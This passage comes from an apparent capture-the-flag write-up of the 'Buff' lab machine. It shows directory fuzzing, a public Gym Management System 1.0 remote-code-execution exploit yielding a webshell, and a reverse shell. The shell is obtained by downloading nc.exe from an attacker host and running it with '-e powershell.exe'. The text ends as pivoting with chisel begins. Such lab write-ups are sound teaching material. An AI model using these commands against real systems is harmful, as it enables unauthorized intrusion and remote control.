</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.198</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span><span class=n>FUZZ</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>files</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>fc</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>2.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.198</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span><span class=n>FUZZ</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>files</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>home</span><span class=o>.</span><span class=n>php</span>                <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>143</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>18</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>register</span><span class=o>.</span><span class=n>php</span>            <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>137</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>23</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>contact</span><span class=o>.</span><span class=n>php</span>             <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>4169</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>798</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>119</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=o>.</span><span class=n>php</span>               <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>4969</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>935</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>134</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>feedback</span><span class=o>.</span><span class=n>php</span>            <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>4252</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>760</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>114</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>.</span>                       <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>4969</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>935</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>134</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>upload</span><span class=o>.</span><span class=n>php</span>              <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>107</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>12</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=o>.</span><span class=n>php</span>                <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>4282</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>844</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>122</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>about</span><span class=o>.</span><span class=n>php</span>               <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>5316</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>999</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>142</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>up</span><span class=o>.</span><span class=n>php</span>                  <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>209</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>23</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>5</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>profile</span><span class=o>.</span>                <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>301</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>346</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>22</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>10</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>packages</span><span class=o>.</span><span class=n>php</span>            <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>7787</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>2315</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>169</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>10848</span><span class=o>/</span><span class=mi>10848</span><span class=p>]</span> <span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>75</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>03</span><span class=p>:</span><span class=mi>06</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>I discovered a lot of promising pages: register, feedback, upload, edit, up,
profile.</p><p>By submitting erroneous stuff at the edit page I obtained a full path disclosure:
<code>C:\xampp\htdocs\gym\editp.php</code></p><p>Also a HTTP error is disclosing the versions: Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</p><p>On the contact page we can see: <code>Made using Gym Management Software 1.0 </code>.</p><h2 id=http-exploitation>HTTP exploitation<a hidden class=anchor aria-hidden=true href=#http-exploitation>#</a></h2><p>It seems it really exists:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>searchsploit</span> <span class=n>Gym</span> <span class=n>Management</span>
</span></span><span class=line><span class=cl><span class=o>------------------------------------------------------------------------------------</span> <span class=o>---------------------------------</span>
</span></span><span class=line><span class=cl> <span class=n>Exploit</span> <span class=n>Title</span>                                                                      <span class=o>|</span>  <span class=ne>Path</span>
</span></span><span class=line><span class=cl><span class=o>------------------------------------------------------------------------------------</span> <span class=o>---------------------------------</span>
</span></span><span class=line><span class=cl><span class=n>Gym</span> <span class=n>Management</span> <span class=n>System</span> <span class=mf>1.0</span> <span class=o>-</span> <span class=n>Unauthenticated</span> <span class=n>Remote</span> <span class=n>Code</span> <span class=n>Execution</span>                   <span class=o>|</span> <span class=n>php</span><span class=o>/</span><span class=n>webapps</span><span class=o>/</span><span class=mf>48506.</span><span class=n>py</span>
</span></span><span class=line><span class=cl><span class=o>------------------------------------------------------------------------------------</span> <span class=o>---------------------------------</span>
</span></span><span class=line><span class=cl><span class=n>Shellcodes</span><span class=p>:</span> <span class=n>No</span> <span class=n>Results</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>searchsploit</span> <span class=o>-</span><span class=n>p</span> <span class=mi>48506</span>
</span></span><span class=line><span class=cl>  <span class=n>Exploit</span><span class=p>:</span> <span class=n>Gym</span> <span class=n>Management</span> <span class=n>System</span> <span class=mf>1.0</span> <span class=o>-</span> <span class=n>Unauthenticated</span> <span class=n>Remote</span> <span class=n>Code</span> <span class=n>Execution</span>
</span></span><span class=line><span class=cl>      <span class=n>URL</span><span class=p>:</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>www</span><span class=o>.</span><span class=n>exploit</span><span class=o>-</span><span class=n>db</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>exploits</span><span class=o>/</span><span class=mi>48506</span>
</span></span><span class=line><span class=cl>     <span class=ne>Path</span><span class=p>:</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>exploitdb</span><span class=o>/</span><span class=n>exploits</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=n>webapps</span><span class=o>/</span><span class=mf>48506.</span><span class=n>py</span>
</span></span><span class=line><span class=cl><span class=ne>File</span> <span class=n>Type</span><span class=p>:</span> <span class=n>Python</span> <span class=n>script</span><span class=p>,</span> <span class=n>ASCII</span> <span class=n>text</span> <span class=n>executable</span><span class=p>,</span> <span class=n>with</span> <span class=n>CRLF</span> <span class=n>line</span> <span class=n>terminators</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>python2</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>exploitdb</span><span class=o>/</span><span class=n>exploits</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=n>webapps</span><span class=o>/</span><span class=mf>48506.</span><span class=n>py</span>
</span></span><span class=line><span class=cl><span class=n>Traceback</span> <span class=p>(</span><span class=n>most</span> <span class=n>recent</span> <span class=n>call</span> <span class=n>last</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=ne>File</span> <span class=s2>&#34;/usr/share/exploitdb/exploits/php/webapps/48506.py&#34;</span><span class=p>,</span> <span class=n>line</span> <span class=mi>38</span><span class=p>,</span> <span class=ow>in</span> <span class=o>&lt;</span><span class=n>module</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=n>from</span> <span class=n>colorama</span> <span class=n>import</span> <span class=n>Fore</span><span class=p>,</span> <span class=n>Back</span><span class=p>,</span> <span class=n>Style</span>
</span></span><span class=line><span class=cl><span class=n>ImportError</span><span class=p>:</span> <span class=n>No</span> <span class=n>module</span> <span class=n>named</span> <span class=n>colorama</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>sudo</span> <span class=n>pacman</span> <span class=o>-</span><span class=n>S</span> <span class=n>python2</span><span class=o>-</span><span class=n>colorama</span> <span class=o>--</span><span class=n>asdeps</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>python2</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>exploitdb</span><span class=o>/</span><span class=n>exploits</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=n>webapps</span><span class=o>/</span><span class=mf>48506.</span><span class=n>py</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.198</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span>
</span></span><span class=line><span class=cl>            <span class=o>/</span>\
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>vvvvvvvvvvvv</span> \<span class=o>--------------------------------------</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=err>`</span><span class=o>^^^^^^^^^^^^</span> <span class=o>/============</span><span class=n>BOKU</span><span class=o>=====================</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>            \<span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Successfully</span> <span class=n>connected</span> <span class=n>to</span> <span class=n>webshell</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>C</span><span class=p>:</span>\<span class=n>xampp</span>\<span class=n>htdocs</span>\<span class=n>gym</span>\<span class=n>upload</span><span class=o>&gt;</span> <span class=n>C</span><span class=p>:</span>\<span class=n>xampp</span>\<span class=n>htdocs</span>\<span class=n>gym</span>\<span class=n>upload</span><span class=o>&gt;</span> <span class=n>whoami</span>
</span></span><span class=line><span class=cl><span class=n>PNG</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buff</span>\<span class=n>shaun</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=upgrading-from-a-webshell-to-a-reverse-shell>Upgrading from a webshell to a reverse shell<a hidden class=anchor aria-hidden=true href=#upgrading-from-a-webshell-to-a-reverse-shell>#</a></h2><p>I should have a pre-compiled netcat for windows:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pacman -Ql windows-binaries | grep nc
</span></span><span class=line><span class=cl>windows-binaries /usr/share/windows/windows-binaries/nc.exe
</span></span><span class=line><span class=cl>windows-binaries /usr/share/windows/windows-binaries/nc.txt
</span></span><span class=line><span class=cl>windows-binaries /usr/share/windows/windows-binaries/ncat.exe
</span></span><span class=line><span class=cl>windows-binaries /usr/share/windows/windows-binaries/vncviewer.exe
</span></span></code></pre></td></tr></table></div></div><p>Even better I have ncat. Let&rsquo;s share it via a web server.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cp /usr/share/windows/windows-binaries/ncat.exe .
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ruby -run -ehttpd . -p8080
</span></span></code></pre></td></tr></table></div></div><p>Need a listener:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pwncat -l 9999 -vv
</span></span></code></pre></td></tr></table></div></div><p>Download it via the webshell (curl the powershell alias as we are on windows):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl http://10.10.14.146:8080/ncat.exe --output ncat.exe
</span></span></code></pre></td></tr></table></div></div><p>Ncat wasn&rsquo;t working so I retried with nc.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl http://10.10.14.146:8080/nc.exe --output nc.exe
</span></span><span class=line><span class=cl>nc.exe 10.10.14.146 9999 -e powershell.exe
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>xampp</span>\<span class=n>htdocs</span>\<span class=n>gym</span>\<span class=n>upload</span><span class=o>&gt;</span> <span class=n>whoami</span>
</span></span><span class=line><span class=cl><span class=n>buff</span>\<span class=n>shaun</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>xampp</span>\<span class=n>htdocs</span>\<span class=n>gym</span>\<span class=n>upload</span><span class=o>&gt;</span> <span class=n>gc</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>shaun</span>\<span class=n>Desktop</span>\<span class=n>user</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>f03b243a0738b73cb640ee8b7b1928d7</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-shaun-to-administrator>Privilege Escalation of Machine : from shaun to administrator<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-shaun-to-administrator>#</a></h2><blockquote><p>Check for restricted services from the outside</p></blockquote><p>Ref. <a href=https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#open-ports>HackTricks - Windows Local Privilege Escalation - Open Ports</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>xampp</span>\<span class=n>htdocs</span>\<span class=n>gym</span>\<span class=n>upload</span><span class=o>&gt;</span> <span class=n>netstat</span> <span class=o>-</span><span class=n>ano</span>
</span></span><span class=line><span class=cl><span class=n>netstat</span> <span class=o>-</span><span class=n>ano</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Active</span> <span class=n>Connections</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>Proto</span>  <span class=n>Local</span> <span class=n>Address</span>          <span class=n>Foreign</span> <span class=n>Address</span>        <span class=n>State</span>           <span class=n>PID</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>135</span>            <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>960</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>445</span>            <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>5040</span>           <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>5672</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>7680</span>           <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>8564</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>8080</span>           <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>3176</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>49664</span>          <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>528</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>49665</span>          <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>1088</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>49666</span>          <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>1548</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>49667</span>          <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>2160</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>49668</span>          <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>668</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>49669</span>          <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>688</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=p>:</span><span class=mi>3306</span>         <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>4736</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=p>:</span><span class=mi>3306</span>         <span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=p>:</span><span class=mi>50755</span>        <span class=n>TIME_WAIT</span>       <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=n>TCP</span>    <span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=p>:</span><span class=mi>8888</span>         <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>0</span>              <span class=n>LISTENING</span>       <span class=mi>644</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></td></tr></table></div></div><p>We have a MySQL server and an unknown service running locally. We may need
some pivoting technique to access it (see <a href=https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/>Network pivoting state of the art - Chisel - Reverse remote port forwarding</a>).</p><p>[chisel] is one of the best tool out there for pivoting and it has
<a href=https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_amd64.gz>a pre-compiled windows binary</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ 7z e chisel_1.7.2_windows_amd64.gz
</span></span></code></pre></td></tr></table></div></div><p>Start the server on your machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
